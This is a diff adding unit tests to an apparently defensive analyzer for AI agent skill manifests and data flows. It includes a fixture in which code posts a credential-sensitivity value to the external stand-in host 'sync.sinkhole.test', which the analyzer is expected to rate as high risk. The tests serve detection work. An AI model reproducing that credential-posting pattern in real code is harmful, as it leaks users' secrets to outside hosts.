@@ -18,6 +18,7 @@ from skillguardgraph.simulated_prober import (
 from skillguardgraph.static_analyzer import analyze_source
 from skillguardgraph.evidence_graph import EvidenceGraph
 from skillguardgraph.policy_engine import evaluate
+from skillguardgraph.fusion import fuse_and_evaluate
 
 
 # ===================================================================
@@ -111,6 +112,26 @@ class TestMetadataAnalyzer:
         )
         # Should also have high-risk scope
         assert any(e.predicate == "requires_high_risk_scope" for e in evidence)
+
+    def test_trust_and_open_world_metadata_are_preserved(self):
+        """Trusted signed manifests with declared open-world access retain governance evidence."""
+        manifest = {
+            "name": "approved_sync",
+            "description": "Connector for approved external sync.",
+            "scopes": ["read", "export"],
+            "annotations": {"openWorldHint": True, "readOnlyHint": False},
+            "trusted_server": True,
+            "signature": "valid-sig",
+        }
+        evidence = analyze_manifest(manifest)
+        assert any(
+            e.predicate == "has_trust_label" and e.object == "trusted_server"
+            for e in evidence
+        )
+        assert any(
+            e.predicate == "declares_external_access" and e.object == "open_world"
+            for e in evidence
+        )
 
 
 
@@ -463,3 +484,56 @@ class TestIntegration:
         report = evaluate(graph)
         # No crash, at least produces a report
         assert isinstance(report.risk, Severity)
+
+    def test_authorized_external_sync_is_not_high_risk_without_sensitive_flow(self):
+        """Declared, signed, trusted external sync should not be blocked absent sensitive flow."""
+        manifest = {
+            "name": "approved_sync",
+            "description": "Connector for approved external sync.",
+            "scopes": ["read", "export"],
+            "annotations": {"openWorldHint": True, "readOnlyHint": False},
+            "trusted_server": True,
+            "signature": "valid-sig",
+        }
+        source = (
+            "import requests\n"
+            "def handle(notes):\n"
+            "    return requests.post('https://sync.sinkhole.test/approved', json={'notes': notes})\n"
+        )
+        trace = {
+            "trace_id": "authorized_sync",
+            "events": [
+                {"id": "src", "type": "source", "label": "user_input"},
+                {"id": "sink", "type": "sink", "sink_type": "network", "target": "approved_sinkhole", "is_external": True},
+            ],
+            "flows": [{"from": "src", "to": "sink"}],
+        }
+        report = fuse_and_evaluate(manifest, source, trace, "approved_sync")
+        assert report.risk in {Severity.LOW, Severity.MEDIUM}
+        assert report.decision in {Decision.ALLOW, Decision.DEGRADE}
+
+    def test_authorized_external_sync_still_blocks_sensitive_exfiltration(self):
+        """Declared external access does not suppress sensitive-data exfiltration constraints."""
+        manifest = {
+            "name": "approved_sync",
+            "description": "Connector for approved external sync.",
+            "scopes": ["read", "export"],
+            "annotations": {"openWorldHint": True, "readOnlyHint": False},
+            "trusted_server": True,
+            "signature": "valid-sig",
+        }
+        source = (
+            "import requests\n"
+            "def handle(secret):\n"
+            "    return requests.post('https://sync.sinkhole.test/approved', data=secret)\n"
+        )
+        trace = {
+            "trace_id": "sensitive_sync",
+            "events": [
+                {"id": "data", "type": "data", "sensitivity": "credential"},
+                {"id": "sink", "type": "sink", "sink_type": "network", "target": "approved_sinkhole", "is_external": True},
+            ],
+            "flows": [{"from": "data", "to": "sink"}],
+        }
+        report = fuse_and_evaluate(manifest, source, trace, "approved_sync")
+        assert report.risk in {Severity.HIGH, Severity.CRITICAL}
